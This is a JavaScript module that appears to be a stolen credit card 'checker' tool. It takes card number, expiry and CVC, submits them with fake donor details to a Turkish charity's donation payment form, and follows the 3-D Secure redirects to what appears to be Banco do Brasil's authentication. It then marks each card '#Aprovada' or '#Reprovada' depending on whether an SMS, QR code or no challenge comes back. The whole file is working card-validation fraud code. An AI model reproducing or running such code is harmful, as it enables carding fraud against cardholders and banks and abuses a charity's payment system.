import axios from "axios";
import {
    load
} from "cheerio";
import {
    wrapper
} from "axios-cookiejar-support";
import {
    CookieJar
} from "tough-cookie";

export async function checker_bb(card_params) {
    //split with multiple separators -> |,.:;/
    const split_card = card_params.split(/[\s|,.:;/]+/);

    //new card with +
    const new_card = `${split_card[0].substring(0,4)}-${split_card[0].substring(4,8)}-${split_card[0].substring(8,12)}-${split_card[0].substring(12,16)}`;

    //set cookie
    const jar = new CookieJar();
    const instance = wrapper(axios.create({
        jar
    }));

    //requests
    try {
        const req = await axios.post('https://www.sehader.com/tr/payment/', `bagisciAlankodu=55&bagisciTelefon=91991821291&bagisciAdsoyad=admin+admin&bagisciFiyat=50&bagisciKartAdi=admin+admin&bagisciKartNo=${new_card}&bagisciSonAy=${split_card[1]}&bagisciSonYil=${split_card[2].substring(2)}&bagisciCvc2=${split_card[3]}`, {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': 'pt-BR,pt;q=0.9',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'www.sehader.com',
            'Origin': 'https://www.sehader.com',
            'Referer': 'https://www.sehader.com/tr/bagislar/9/egitim',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36'
        });

        const html = load(req.data);
        const value_url = html('[name="downloadForm"]').attr('action');
        const value_pareq = html('[name="PaReq"]').attr('value');
        const value_md = html('[name="MD"]').attr('value');
        const value_termurl = html('[name="TermUrl"]').attr('value');

        if (value_pareq == undefined || value_md == undefined || value_termurl == undefined || value_url.includes('auth.bb') == false) {
            return `<font style="color: red;">#Reprovada ${card_params} ➜ auth 3ds ➜ empty tokens</font>`;
        }

        const req_two = await instance.post(value_url, `PaReq=${encodeURIComponent(value_pareq)}&MD=${encodeURIComponent(value_md)}&TermUrl=${encodeURIComponent(value_termurl)}`);

        const html2 = load(req_two.data);
        const value_url2 = html2('[method="post"]').attr('action');

        const req_tree = await instance.post(`https://${req_two.request.host + value_url2}`, `TermUrl=${encodeURIComponent(value_termurl)}&PaReq=${encodeURIComponent(value_pareq)}&MD=${encodeURIComponent(value_md)}`);

        if (req_tree.data.includes('Abra o aplicativo do BB em seu smartphone') == true) {
            return `<font style="color: green;">#Aprovada ${card_params} ➜ auth 3ds ➜ QR-CODE</font>`;
        }
        if (req_tree.data.includes('Ocorreu um erro durante o processamento de sua') == true) {
            return `<font style="color: red;">#Reprovada ${card_params} ➜ auth 3ds ➜ authentication error</font>`;
        }

        const req_for = await instance.get(`https://${req_tree.request.host + req_tree.request.res.responseUrl.split('=')[1]}`);

        if (req_for.data.includes('Prezado cliente, voc&ecirc; n&atilde;o possui o M&oacute') == true) {
            return `<font style="color: green;">#Aprovada ${card_params} ➜ auth 3ds ➜ CLEAN</font>`;
        }
        if (req_for.data.includes('Selecione um celular para receber') == true) {
            return `<font style="color: green;">#Aprovada ${card_params} ➜ auth 3ds ➜ SMS</font>`;
        } else {
            return `<font style="color: red;">#Reprovada ${card_params} ➜ auth 3ds ➜ card declined</font>`;
        }
    } catch (error) {
        console.log(error)
        return `<font style="color: red;">#Reprovada ${card_params} ➜ API ➜ request failed</font>`;
    }
}